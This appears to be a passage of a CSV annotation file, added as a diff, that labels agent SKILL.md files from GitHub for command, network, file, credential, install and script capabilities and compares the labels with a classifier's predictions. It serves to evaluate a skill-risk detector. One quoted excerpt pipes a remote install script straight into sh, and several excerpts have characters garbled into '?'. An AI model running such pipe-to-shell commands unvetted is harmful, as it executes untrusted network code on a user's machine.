+L175: 'Authorization': `Bearer ${process.env.AGENTWALLET_API_TOKEN}`,
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L212: > For programmatic signing patterns (@x402/fetch, viem, ethers.js, Solana, Vincent), see `references/REFERENCE.md`. These require a dedicated hot wallet with minimal funds — never use your main wallet.",000619011f52b081f35aacc3c94d5af4411b7db9,reused,None,None
+82,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/git-pr-merge/SKILL.md,"CMD, NET, FS",None,No agreement,"NET: L22 candidate; distinguish remote operation from URL/reference or local command. | Provisional FP: None; FN: CMD, NET, FS","CMD (Yes): L22: -   Switch to `main` and pull the latest changes: `git checkout main; git pull origin main`.
+L23: -   Switch back to `dev` and merge `main` to ensure the local development branch is up-to-date: `git checkout dev; git merge main`.
+L24: -   Push the updated `dev` branch to the remote: `git push origin dev`.
+NET (Yes): L22: -   Switch to `main` and pull the latest changes: `git checkout main; git pull origin main`.
+L24: -   Push the updated `dev` branch to the remote: `git push origin dev`.
+L5: description: Conducts an audit of a Pull Request, merges it into main, and synchronizes the local environment. Use this skill when a PR is ready for final review and integration.
+FS (Yes): L15: -   Create an audit report in `audit_reports/audit_PR-[id].md` confirming compliance with tech specs and UI guides.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00062a8f1fc28199cae258fbdcf1ea0b580d1980,reused,None,"CMD, NET, FS"
+83,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/nano-pdf/SKILL.md,"CMD, NET, FS, CRED, INST","CMD, NET, CRED, INST",Partial agreement,NET: L53 candidate; distinguish remote operation from URL/reference or local command. CRED: L53 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. INST: L53 candidate; distinguish installation from prerequisites or ordinary execution. SCRIPT: L53 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: FS,"CMD (Yes): L53: Integrate by setting `$NANO_PDF_API_KEY` for authenticated requests; for local use, install via `pip install nano-pdf` and import as a module. Combine with other tools: pipe CLI output to NLP libraries for mining, or use in Node.js via HTTP requests. For OCR, ensure Tesseract is installed and config
+NET (Yes): L53: Integrate by setting `$NANO_PDF_API_KEY` for authenticated requests; for local use, install via `pip install nano-pdf` and import as a module. Combine with other tools: pipe CLI output to NLP libraries for mining, or use in Node.js via HTTP requests. For OCR, ensure Tesseract is installed and config
+L36: ## Common Commands/API
+L37: CLI commands use `nano-pdf` binary; API endpoints are under `https://api.opencclaw.com/nano-pdf/`. Authentication requires `$NANO_PDF_API_KEY` environment variable.
+FS (Yes): No supporting excerpt identified.
+CRED (Yes): L53: Integrate by setting `$NANO_PDF_API_KEY` for authenticated requests; for local use, install via `pip install nano-pdf` and import as a module. Combine with other tools: pipe CLI output to NLP libraries for mining, or use in Node.js via HTTP requests. For OCR, ensure Tesseract is installed and config
+L37: CLI commands use `nano-pdf` binary; API endpoints are under `https://api.opencclaw.com/nano-pdf/`. Authentication requires `$NANO_PDF_API_KEY` environment variable.
+L43: - API endpoint for extraction: POST /extract with body `{""file"": ""base64encoded_content"", ""ocr"": true}` and header `Authorization: Bearer $NANO_PDF_API_KEY`.
+INST (Yes): L53: Integrate by setting `$NANO_PDF_API_KEY` for authenticated requests; for local use, install via `pip install nano-pdf` and import as a module. Combine with other tools: pipe CLI output to NLP libraries for mining, or use in Node.js via HTTP requests. For OCR, ensure Tesseract is installed and config
+SCRIPT (No): L53: Integrate by setting `$NANO_PDF_API_KEY` for authenticated requests; for local use, install via `pip install nano-pdf` and import as a module. Combine with other tools: pipe CLI output to NLP libraries for mining, or use in Node.js via HTTP requests. For OCR, ensure Tesseract is installed and config",00064c579baadf5eb71d13e01a3019001cbca5a8,reused,None,FS
+84,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/sandboxes-js-sdk/SKILL.md,"CMD, NET, CRED, INST",INST,Partial agreement,"NET: L23 candidate; distinguish remote operation from URL/reference or local command. INST: L27 candidate; distinguish installation from prerequisites or ordinary execution. SCRIPT: L5 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD, NET, CRED","CMD (Yes): L30: 4. Execute commands or retrieve logs/status through the SDK.
+L35: - Install the SDK: `npm install @koyeb/sandbox-sdk`
+NET (Yes): L23: - API token available as `KOYEB_API_TOKEN`
+FS (No): No supporting excerpt identified.
+CRED (Yes): No supporting excerpt identified.
+INST (Yes): L27: 1. Install the SDK package.
+L35: - Install the SDK: `npm install @koyeb/sandbox-sdk`
+SCRIPT (No): L5: description: Use the Koyeb Sandbox JS SDK (@koyeb/sandbox-sdk) to create and manage sandboxes programmatically from Node.js. Use when the user wants JavaScript/TypeScript sandbox automation.
+L7: compatibility: Requires Node.js, npm/pnpm, and network access.
+L21: - Node.js environment",0006617d83ac731b3c509d920cd876b801fbc348,reused,None,"CMD, NET, CRED"
+85,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/wikidata-search/SKILL.md,"CMD, NET","CMD, NET",Exact agreement,NET: L38 candidate; distinguish remote operation from URL/reference or local command. SCRIPT: L145 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: None,"CMD (Yes): L115: curl -G 'https://query.wikidata.org/sparql' --data-urlencode 'query=SELECT * WHERE { wd:Q42 ?p ?o } LIMIT 5' -H 'Accept: application/sparql-results+json'
+L143: ## Python Script Usage
+L37: ```bash
+NET (Yes): L38: curl 'https://www.wikidata.org/w/api.php?action=wbsearchentities&search=QUERY&language=en&format=json&type=item&limit=10'
+L60: curl 'https://www.wikidata.org/w/api.php?action=wbgetentities&ids=Q42&format=json&props=labels|descriptions|aliases|claims'
+L73: curl 'https://www.wikidata.org/w/api.php?action=wbgetclaims&entity=Q42&property=P31&format=json'
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L145: Use `scripts/wikidata_api.py` for programmatic access:",0006658f73b7ccdc55540db22beb14ed3c42cd84,reused,None,None
+86,https://github.com/mergesort/Recap/blob/HEAD/.agents/skills/recap-integration/SKILL.md,FS,None,No agreement,NET: L63 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. FS: L24 is conditional/example-like; distinguish available capability from mandatory action. | Provisional FP: None; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (No): L24: Read additional public API files in `Sources/Recap/Public/` only if the task touches a specific type.
+L63: - Do not replace `RecapDisplayPolicy` with custom version-comparison logic unless the user explicitly needs behavior outside the public API.
+FS (Yes): L24: Read additional public API files in `Sources/Recap/Public/` only if the task touches a specific type.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0006af9a25a43b16bdeaacdce3c01f2a8ef6ade4,reused,None,FS
+87,https://github.com/zhangwenm/java-coding/blob/HEAD/.agents/skills/autocli/SKILL.md,"CMD, NET, FS, CRED, INST","CMD, NET, FS, INST",Partial agreement,CMD: L23 is conditional/example-like; distinguish available capability from mandatory action. NET: L23 is conditional/example-like; distinguish available capability from mandatory action. INST: L23 is conditional/example-like; distinguish available capability from mandatory action. SCRIPT: L23 is conditional/example-like; distinguish available capability from mandatory action. | Provisional FP: None; FN: CRED,"CMD (Yes): L279: | `v2ex node` | `--name <node>`, `--limit N` | Node topics |
+L23: ** If autocli is not installed or missing, you can install it with `curl -fsSL https://raw.githubusercontent.com/nashsu/AutoCLI/main/scripts/install.sh | sh`, if is in windows, ask user to install from https://github.com/nashsu/AutoCLI**
+L20: ```bash
+NET (Yes): L6: Use autocli CLI to interact with social/content websites (HackerNews, DevTo, Lobsters, StackOverflow, Steam, Linux-do, Arxiv, Wikipedia, Apple-Podcasts, Xiaoyuzhou, BBC, Hugging Face, SinaFinance, Google, V2EX, Bloomberg, Twitter/X, Bilibili, Reddit, Zhihu, Xiaohongshu, Xueqiu, Weibo, Douban, WeRead
+L23: ** If autocli is not installed or missing, you can install it with `curl -fsSL https://raw.githubusercontent.com/nashsu/AutoCLI/main/scripts/install.sh | sh`, if is in windows, ask user to install from https://github.com/nashsu/AutoCLI**
+L58: autocli twitter reply --url ""https://x.com/.../status/123"" --text ""Great post!""
+FS (Yes): L650: | `yollomi edit` | `--image <path>`, `--prompt <str>` | Edit image |
+L653: | `yollomi remove-bg` | `--image <path>` | Remove background |
+CRED (Yes): No supporting excerpt identified.
+INST (Yes): L23: ** If autocli is not installed or missing, you can install it with `curl -fsSL https://raw.githubusercontent.com/nashsu/AutoCLI/main/scripts/install.sh | sh`, if is in windows, ask user to install from https://github.com/nashsu/AutoCLI**
+SCRIPT (No): L23: ** If autocli is not installed or missing, you can install it with `curl -fsSL https://raw.githubusercontent.com/nashsu/AutoCLI/main/scripts/install.sh | sh`, if is in windows, ask user to install from https://github.com/nashsu/AutoCLI**",0006b5e54628b8e4d1798a50c3cb93db1a2ac48c,reused,None,CRED
+88,https://github.com/mcampbellr/.dotfiles/blob/HEAD/claude/.claude/skills/gsd-inbox/SKILL.md,"CMD, NET",None,No agreement,"NET: L35 candidate; distinguish remote operation from URL/reference or local command. | Provisional FP: None; FN: CMD, NET","CMD (Yes): L35: - `--repo owner/repo` — Override auto-detected repository (defaults to current git remote)
+NET (Yes): L35: - `--repo owner/repo` — Override auto-detected repository (defaults to current git remote)
+L22: **Flow:** Detect repo ? Fetch open issues + PRs ? Classify each by type ? Review against template ? Report findings ? Optionally act (label, comment, close)
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00076c3cfabfd0e211079180b2cec3477fff432a,reused,None,"CMD, NET"
+89,https://github.com/gabrielmoreira/agent-skills-mirror/blob/HEAD/mirrors/repos/jeremylongshore@claude-code-plugins-plus-skills/plugins/saas-packs/langfuse-pack/skills/langfuse-multi-env-setup/SKILL.md,"CMD, NET, FS, CRED, INST",None,No agreement,"NET: L30 candidate; distinguish remote operation from URL/reference or local command. CRED: L233 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. INST: L194 candidate; distinguish installation from prerequisites or ordinary execution. | Provisional FP: None; FN: CMD, NET, FS, CRED, INST","CMD (Yes): L194: - run: npm ci && npm run build && npm run deploy:staging
+L207: - run: npm ci && npm run build && npm run deploy:production
+L125: ```bash
+NET (Yes): L30: Configure Langfuse across dev/staging/production with isolated API keys, environment-specific SDK settings, secret management, and CI/CD integration to prevent cross-environment data leakage.
+L34: - Separate Langfuse API key pairs per environment (or separate projects)
+L40: | Environment | API Key Source | Langfuse Project | Settings |
+FS (Yes): L168: echo -n ""pk-lf-prod-..."" | gcloud secrets create langfuse-public-key-prod --data-file=-
+L169: echo -n ""sk-lf-prod-..."" | gcloud secrets create langfuse-secret-key-prod --data-file=-
+CRED (Yes): L233: | Leaked keys in git | `.env` in `.gitignore`, secret scanning in CI |
+L30: Configure Langfuse across dev/staging/production with isolated API keys, environment-specific SDK settings, secret management, and CI/CD integration to prevent cross-environment data leakage.
+L34: - Separate Langfuse API key pairs per environment (or separate projects)
+INST (Yes): L194: - run: npm ci && npm run build && npm run deploy:staging
+L207: - run: npm ci && npm run build && npm run deploy:production
+SCRIPT (No): No supporting excerpt identified.",000790b56cf70c8df3a7f8f868689fad7fad8aa3,reused,None,"CMD, NET, FS, CRED, INST"
+90,https://github.com/9aia/pachira/blob/HEAD/.claude/skills/nuxt-seo/SKILL.md,"CMD, NET, FS, INST",None,No agreement,"NET: L43 candidate; distinguish remote operation from URL/reference or local command. FS: L35 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. INST: L12 candidate; distinguish installation from prerequisites or ordinary execution. | Provisional FP: None; FN: CMD, NET, FS, INST","CMD (Yes): L11: ```bash
+L12: npx nuxi module add @nuxtjs/seo
+NET (Yes): L43: | Module            | Purpose         | Key API                       |
+L85: - [Documentation](https://nuxtseo.com)
+L86: - [GitHub](https://github.com/harlan-zw/nuxt-seo)
+FS (Yes): L35: **DO NOT load all files at once.** Load only what's relevant to your current task.
+L90: Main skill: ~250 tokens. Each sub-file: ~400-600 tokens. Only load files relevant to current task.
+CRED (No): No supporting excerpt identified.
+INST (Yes): L12: npx nuxi module add @nuxtjs/seo
+SCRIPT (No): No supporting excerpt identified.",000833a7907aab6365fadfa17e3c685ef650aaec,reused,None,"CMD, NET, FS, INST"
+91,https://github.com/Jahrome907/minecraft-agent-skills/blob/HEAD/.claude/skills/minecraft-world-generation/SKILL.md,"CMD, FS, SCRIPT",None,No agreement,"NET: L17 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L558 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: None; FN: CMD, FS, SCRIPT","CMD (Yes): L557: ```bash
+NET (No): L17: | **BiomeModification API (Fabric)** | Adding features/spawns to existing biomes | Fabric |
+L361: ## Fabric: BiomeModification API (Code)
+L364: import net.fabricmc.fabric.api.biome.v1.BiomeModifications;
+FS (Yes): L555: 1. Create or edit worldgen JSON files in `data/<namespace>/worldgen/` (or equivalent mod resources path).
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): L558: ./scripts/validate-worldgen-json.sh --root /path/to/datapack-or-mod-resources
+L560: ./scripts/validate-worldgen-json.sh --root /path/to/datapack-or-mod-resources --strict",00084d66ade136505a22992f549493df2a2f65b6,widely_reused,None,"CMD, FS, SCRIPT"
+92,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/link-deps/SKILL.md,"CMD, NET","CMD, NET, CRED",Partial agreement,NET: L61 candidate; distinguish remote operation from URL/reference or local command. FS: L35 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: CRED; FN: None,"CMD (Yes): L339: 4. **Batch link**: Run update commands for each discovered relationship
+L358: Run `linear deps --team <TEAM>` and you should see a clear tree structure with minimal orphaned issues.
+L34: ```bash
+NET (Yes): L61: # Find all API-related work
+L62: linear search ""API"" --team ENG --format full
+L165: # Find API foundation work
+FS (No): L35: # 1. Find issues with similar keywords that might be related
+L44: # 4. Find circular dependencies that need fixing
+L55: # Find all auth-related work
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0008c4eb611c5815fe6d3cffae168e5b5413f485,reused,CRED,None
+93,https://github.com/qazz92/oh-my-droid/blob/HEAD/oh-my-droid/skills/task-bg/SKILL.md,"CMD, FS, SCRIPT","CMD, INST",Partial agreement,"NET: L69 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L5 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: INST; FN: FS, SCRIPT","CMD (Yes): L28: 2. LAUNCH - Run `python3 hooks/background-manager.py launch ...`
+L139: 2. **Launch**: Run `python3 hooks/background-manager.py launch ...` via Execute tool
+L53: ```bash
+NET (No): L69: python3 hooks/background-manager.py launch ""Fix API errors"" ""Fix all validation errors in src/api/"" executor-med ""main"" medium
+L76: python3 hooks/background-manager.py launch ""Fix API"" ""Fix API route errors"" executor-med ""main""
+FS (Yes): L66: python3 hooks/background-manager.py launch ""Find auth patterns"" ""Find all authentication implementations in src/"" explorer ""main"" low
+L102: # Reset all tasks from memory (does NOT delete .json files)
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): L5: description: Launch and manage background tasks for parallel droid execution using background-manager.py. Factory Droid has no native run_in_background, so this uses manual Python-based background management.
+L28: 2. LAUNCH - Run `python3 hooks/background-manager.py launch ...`
+L139: 2. **Launch**: Run `python3 hooks/background-manager.py launch ...` via Execute tool",00096e11d936eddbfec06a365785053daf2b78f9,widely_reused,INST,"FS, SCRIPT"
+94,https://github.com/MMorit00/fund-portfolio-bot/blob/HEAD/.claude/skills/roadmap-guide/SKILL.md,FS,"CMD, SCRIPT",No agreement,"No specific ambiguity documented; absence of evidence does not establish absence of capability. | Provisional FP: CMD, SCRIPT; FN: FS","CMD (No): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00098bdcfa1ee40e7478ae65574e7561e4e0453f,reused,"CMD, SCRIPT",FS
+95,https://github.com/rolldown/rolldown/blob/HEAD/.claude/skills/rolldown-repl/SKILL.md,"CMD, FS, SCRIPT",CMD,Partial agreement,"NET: L16 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. FS: L10 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. INST: L91 is conditional/example-like; distinguish available capability from mandatory action. SCRIPT: L29 candidate; distinguish bundled helper invocation from generic or external scripts. SkillGuard prediction unavailable or recorded as None; verify original prediction before attributing an error. | Source SHA not in supplied key. | Provisional FP: None; FN: FS, SCRIPT","CMD (Yes): L29: Run the bundled scripts. They use plain Node (`node:zlib`, `node:buffer`, `node:fs`) — no `npm install` needed.
+L36: node .claude/skills/rolldown-repl/scripts/decode.mjs '<full-url>'
+L37: node .claude/skills/rolldown-repl/scripts/decode.mjs '<full-url>' --write /tmp/repl-repro
+NET (No): L16: - An issue or message links to `https://repl.rolldown.rs/#…` (or any other host serving the rolldown REPL).
+L54: - `--base <url>` — base REPL URL (defaults to `https://repl.rolldown.rs/`).
+FS (Yes): L33: **Decode** prints a JSON summary to stdout, and with `--write` drops each file onto disk:
+L5: description: Use to encode or decode rolldown REPL share URLs — `repl.rolldown.rs/#…`, `rolldown-repl.netlify.app/#…`, or any URL whose hash is a base64-encoded rolldown REPL payload. Decode whenever such a URL appears in the conversation (commonly in GitHub issues with a ""minimal reproduction"" link
+L10: The rolldown REPL stores all state (input files + selected rolldown version) in `location.hash` as `base64(zlib(JSON))`. Browsers never send the hash to the server, so naive HTTP fetches return an empty shell. This skill encodes and decodes that hash locally so you can read what the user had in thei
+CRED (No): No supporting excerpt identified.
+INST (No): L29: Run the bundled scripts. They use plain Node (`node:zlib`, `node:buffer`, `node:fs`) — no `npm install` needed.
+L91: 4. Note the `v` field — if the issue is version-specific, install that exact version before reproducing.
+SCRIPT (Yes): L29: Run the bundled scripts. They use plain Node (`node:zlib`, `node:buffer`, `node:fs`) — no `npm install` needed.
+L36: node .claude/skills/rolldown-repl/scripts/decode.mjs '<full-url>'
+L37: node .claude/skills/rolldown-repl/scripts/decode.mjs '<full-url>' --write /tmp/repl-repro",000a69df6ce9216790b7947d8a93ced0c8cfbaa3,widely_reused,None,"FS, SCRIPT"
+96,https://github.com/Awannaphasch2016/jousef-landing/blob/HEAD/.claude/skills/infrastructure-verification/SKILL.md,"CMD, NET, FS, CRED","CMD, SCRIPT",Partial agreement,"NET: L53 candidate; distinguish remote operation from URL/reference or local command. | Provisional FP: SCRIPT; FN: NET, FS, CRED","CMD (Yes): L41: - Before deploying Lambda functions that make AWS service calls
+L69: ```bash
+L145: ```bash
+NET (Yes): L53: | **Random scattered failures** | Performance issue (slow API, memory) | MEDIUM - Optimize code |
+L348: - Error: `ConnectTimeoutError: Connect timeout on endpoint URL: ""https://bucket.s3.region.amazonaws.com/...""`
+L484: protocol          = ""tcp""
+FS (Yes): L290: cat /tmp/response.json | jq .
+CRED (Yes): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000abf55fe854127c93a8ea4e9f71c5e14e19989,reused,SCRIPT,"NET, FS, CRED"
+97,https://github.com/camillanapoles/bioeolica-dev/blob/HEAD/.specsmd/fire/agents/builder/skills/run-execute/SKILL.md,"CMD, FS, INST, SCRIPT",None,No agreement,"NET: L191 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. INST: L39 candidate; distinguish installation from prerequisites or ordinary execution. SCRIPT: L160 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: None; FN: CMD, FS, INST, SCRIPT","CMD (Yes): L36: <action>Run: npm list yaml --depth=0 2>/dev/null || echo ""NOT_FOUND""</action>
+L39: <action>Run: npm install yaml</action>
+L45: | `yaml` | Parse/stringify state.yaml | `npm install yaml` |
+NET (No): L191: depth 2: packages/api/.specs-fire/standards/
+L387: Editing packages/api/src/handler.go
+L388: ? Apply ""Standards for packages/api/**""
+FS (Yes): L66: <action>Load active run from state.yaml runs.active[0]</action>
+L173: <error>init-run.cjs failed to create run.md. Check script output.</error>
+L181: <action>Load work item from .specs-fire/intents/{intent}/work-items/{id}.md</action>
+CRED (No): No supporting excerpt identified.
+INST (Yes): L39: <action>Run: npm install yaml</action>
+L43: | Package | Purpose | Install Command |
+L45: | `yaml` | Parse/stringify state.yaml | `npm install yaml` |
+SCRIPT (Yes): L160: node scripts/init-run.cjs {rootPath} {workItemId} {intentId} {mode}
+L163: node scripts/init-run.cjs {rootPath} --batch '[
+L254: <code>node scripts/update-checkpoint.cjs {rootPath} {runId} awaiting_approval --checkpoint=plan</code>",000b10b7b3ec00cadf457f60b19914d074b14a50,widely_reused,None,"CMD, FS, INST, SCRIPT"
+98,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/sync/SKILL.md,FS,CMD,No agreement,CMD: L101 is conditional/example-like; distinguish available capability from mandatory action. FS: L103 is conditional/example-like; distinguish available capability from mandatory action. | Provisional FP: CMD; FN: FS,"CMD (No): L101: 2. Call `session_capability_inventory(project_dir, force_refresh=True)` — bypasses cache and regenerates inventory even if git unchanged.
+NET (No): No supporting excerpt identified.
+FS (Yes): L103: 4. Read `CLAUDE-capability-inventory.md` if it exists.
+L5: description: ""Fast save-point: sync all session-context files and MEMORY.md with current progress. Zero questions, zero delay. Use when user says /sync, save progress, save state, sync context, or /sync --full for capability inventory.""
+L11: > Zero questions. Edit files. Print summary. Done.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000b1c2e3f9a8abe9b8a46f6d97670bab6443f85,widely_reused,CMD,FS
+99,https://github.com/gerald-ica/claude-code-config/blob/HEAD/plugins/data-engineering/skills/debugging-dags/SKILL.md,"CMD, NET","CMD, INST, SCRIPT",Partial agreement,"CMD: L27 is conditional/example-like; distinguish available capability from mandatory action. NET: L46 candidate; distinguish remote operation from URL/reference or local command. FS: L28 is conditional/example-like; distinguish available capability from mandatory action. INST: L14 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: INST, SCRIPT; FN: NET","CMD (Yes): L14: Run all `af` commands using uvx (no installation required):
+L27: - Run `af runs diagnose <dag_id> <dag_run_id>` (if run_id is provided)
+L28: - If no run_id specified, run `af dags stats` to find recent failures
+NET (Yes): L46: - **Dependency issue**: Upstream failure, external API down, rate limiting
+L66: - **Observability**: Use the Astro [observability dashboard](https://www.astronomer.io/docs/astro/airflow-alerts) to track DAG health trends and spot recurring issues
+FS (No): L28: - If no run_id specified, run `af dags stats` to find recent failures
+L31: - Run `af health` to find recent failures across all DAGs
+L41: 2. **Look for the actual exception** - scroll past the Airflow boilerplate to find the real error
+CRED (No): No supporting excerpt identified.
+INST (No): L14: Run all `af` commands using uvx (no installation required):
+L17: uvx --from astro-airflow-mcp af <command>
+L20: Throughout this document, `af` is shorthand for `uvx --from astro-airflow-mcp af`.
+SCRIPT (No): No supporting excerpt identified.",000c2422ab6257539adbdf5c4441531dafb5ce31,widely_reused,"INST, SCRIPT",NET
+100,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/heath-ledger/SKILL.md,"CMD, NET, FS, CRED, SCRIPT",None,No agreement,"NET: L17 is conditional/example-like; distinguish available capability from mandatory action. CRED: L28 is conditional/example-like; distinguish available capability from mandatory action. SCRIPT: L59 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: None; FN: CMD, NET, FS, CRED, SCRIPT","CMD (Yes): L59: All scripts are in `scripts/`. Run with bash or node. Database is SQLite at `data/heath.db`.
+NET (Yes): L26: Get from Mercury Dashboard ? Settings ? API Tokens. The token gives read-only access to transactions.
+L17: 4. *(If Stripe connected)* `scripts/pull_stripe_revenue.sh <entity_id> <start_date> <end_date>` — pull monthly revenue data
+L25: ### Mercury API Key (Required)
+FS (Yes): L55: 5. **Generate books** — `scripts/generate_books.sh <entity_id> <start_date> <end_date> [output_path]`
+CRED (Yes): L25: ### Mercury API Key (Required)
+L28: ### Stripe API Key (Optional but Recommended)
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): L59: All scripts are in `scripts/`. Run with bash or node. Database is SQLite at `data/heath.db`.
+L14: 1. `scripts/init_db.mjs` — creates DB + seeds ~90 universal vendor?category rules
+L15: 2. `scripts/connect_mercury.sh <MERCURY_API_TOKEN> [entity_name]` — discovers accounts",000c4280cd9cb73fbea6703eaac6241fea30c4dd,widely_reused,None,"CMD, NET, FS, CRED, SCRIPT"
+101,https://github.com/aramz33/memoire-clo/blob/HEAD/.claude/skills/voice-dna-creator/SKILL.md,FS,"CMD, INST",No agreement,"CMD: L152 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: CMD, INST; FN: FS","CMD (No): L152: - Make the profile actionable for content generation
+NET (No): No supporting excerpt identified.
+FS (Yes): L140: 3. Save to `/context/voice-dna.json`
+L85: Create the profile following this structure:
+L138: 2. Generate the complete JSON voice profile
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000d44bc90178e8cf43d0a836aad9944fce2a46a,widely_reused,"CMD, INST",FS
+102,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/dapp-sdd-specify/SKILL.md,FS,None,No agreement,L25: - **Target Audience:** Who will learn from this example — contextual reference or example may be mistaken for operational capability; inspect surrounding instructions. | Provisional FP: None; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (Yes): L57: 1. Read the README.md content provided
+L63: 7. Save to `.dapp-sdd/spec.md`
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000d7782926bfb7183328f307cf735811eee2b00,widely_reused,None,FS
+103,https://github.com/ohdaveed/director-hearing-manager/blob/HEAD/.claude/skills/find-docs/SKILL.md,"CMD, NET, INST",None,No agreement,"CMD: L52 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. NET: L6 candidate; distinguish remote operation from URL/reference or local command. FS: L52 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. INST: L29 candidate; distinguish installation from prerequisites or ordinary execution. SCRIPT: L9 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD, NET, INST","CMD (Yes): L29: npm install -g ctx7@latest
+L52: IMPORTANT: Do not run these commands more than 3 times per question. If you cannot find what you need after 3 attempts, use the best result you have.
+L26: Make sure the CLI is up to date before running commands:
+NET (Yes): L6: Retrieves up-to-date documentation, API references, and code examples for any
+L10: training data may not reflect recent API changes or version updates.
+L12: Always use for: API syntax questions, configuration options, version migration
+FS (No): L52: IMPORTANT: Do not run these commands more than 3 times per question. If you cannot find what you need after 3 attempts, use the best result you have.
+CRED (No): No supporting excerpt identified.
+INST (Yes): L29: npm install -g ctx7@latest
+L35: npx ctx7@latest <command>
+SCRIPT (No): L9: like React, Next.js, Prisma, Express, Tailwind, Django, or Spring Boot. Your
+L97: ctx7 docs /vercel/next.js ""How to set up app router""
+L100: ctx7 docs /vercel/next.js/v14.3.0-canary.87 ""How to set up app router""",000df18d2253b094e8946b80d0c48f09027858ff,widely_reused,None,"CMD, NET, INST"
+104,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/refresh-content/SKILL.md,"NET, FS",None,No agreement,"CMD: L26 is conditional/example-like; distinguish available capability from mandatory action. NET: L32 candidate; distinguish remote operation from URL/reference or local command. FS: L26 is conditional/example-like; distinguish available capability from mandatory action. | Provisional FP: None; FN: NET, FS","CMD (No): L26: - For each statistic or claim: verify still accurate, find updated data if outdated
+L27: - For each external link: check if live and relevant, find replacement if broken
+NET (Yes): L32: Research current SERP for this topic.
+FS (Yes): L26: - For each statistic or claim: verify still accurate, find updated data if outdated
+L27: - For each external link: check if live and relevant, find replacement if broken
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000e01c7b98a1f0682dc52e974e0344221663112,widely_reused,None,"NET, FS"
+105,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/quality/SKILL.md,FS,"CMD, INST",No agreement,"NET: L27 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: CMD, INST; FN: FS","CMD (No): No supporting excerpt identified.
+NET (No): L27: ? • API ??   ? • ????   ? • ??????          ?
+L37: | ?? API ??     | ????   | `/security` |
+L54: - API ????
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000e5dcf09ea06efbf056a07bd8a5b086cc003f7,widely_reused,"CMD, INST",FS
+106,https://github.com/guitarbeat/slavv2python/blob/HEAD/.claude/skills/review-and-ship/SKILL.md,"CMD, NET, FS",None,No agreement,"NET: L26 candidate; distinguish remote operation from URL/reference or local command. SkillGuard prediction unavailable or recorded as None; verify original prediction before attributing an error. | Source SHA not in supplied key. | Provisional FP: None; FN: CMD, NET, FS","CMD (Yes): L26: git fetch origin main
+L27: git diff origin/main...HEAD
+L28: git status
+NET (Yes): L26: git fetch origin main
+L21: 6. Push branch and open or update a PR.
+FS (Yes): L27: git diff origin/main...HEAD
+L28: git status
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
